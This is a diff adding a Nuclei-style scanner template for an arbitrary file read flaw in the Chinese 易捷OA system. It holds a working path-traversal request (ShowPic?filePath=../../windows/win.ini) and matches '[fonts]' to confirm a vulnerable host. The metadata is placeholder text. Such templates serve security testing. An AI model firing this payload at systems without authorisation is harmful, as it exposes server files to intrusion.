@@ -1,0 +1,28 @@
+id: 易捷OA任意文件读取漏洞
+info:
+  name: Affection
+  author: ASUS
+  severity: info
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /servlet/ShowPic?filePath=../../windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+        Cookie: JSESSIONID=7264A9891CF237FBCA523D5E144C66B7
+        Upgrade-Insecure-Requests: 1
+        Priority: u=0, i
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[fonts]'
